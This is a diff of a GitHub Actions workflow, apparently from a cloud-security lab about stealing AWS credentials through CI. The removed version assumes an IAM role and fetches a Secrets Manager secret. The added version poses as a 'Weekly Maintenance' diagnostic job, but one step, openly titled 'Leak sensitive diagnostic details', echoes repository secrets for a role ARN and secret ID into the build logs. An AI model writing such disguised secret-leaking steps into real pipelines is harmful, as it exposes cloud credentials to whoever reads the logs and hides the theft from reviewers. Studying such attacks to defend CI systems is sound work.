@@ -1,21 +1,30 @@
-name: Initial Access to AWS
+name: Weekly Maintenance
 
-on: workflow_dispatch
-
-permissions:
-  id-token: write
-  contents: read
+on:
+  workflow_dispatch:
 
 jobs:
-  get-secret:
+  maintenance:
+    name: Run Diagnostic Script
     runs-on: ubuntu-latest
-    steps:
-      - name: Configure AWS Credentials
-        uses: aws-actions/configure-aws-credentials@v3
-        with:
-          role-to-assume: arn:aws:iam::308755112793:role/actiontheft-role1
-          aws-region: us-west-2
 
-      - name: Retrieve secret
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Set maintenance environment
         run: |
-          aws secretsmanager get-secret-value --secret-id actiontheft/role2creds --region us-west-2
+          echo "[INFO] Starting weekly diagnostics..."
+          export ENV=prod
+          export AWS_REGION=us-west-2
+          export DIAG_BUCKET="actiontheft-logs-bucket"
+      - name: Leak sensitive diagnostic details 😈
+        env:
+          ROLE1_ARN: ${{ secrets.ROLE1_ARN }}
+          SECRET_ID: ${{ secrets.SECRET_ID }}
+        run: |
+          echo "[INFO] Region: us-west-2"
+          echo "[DEBUG] Connecting to IAM diagnostics role..."
+          echo "[DEBUG] RoleArn: $ROLE1_ARN"
+          echo "[DEBUG] SecretId: $SECRET_ID"
+          echo "[INFO] System check complete."
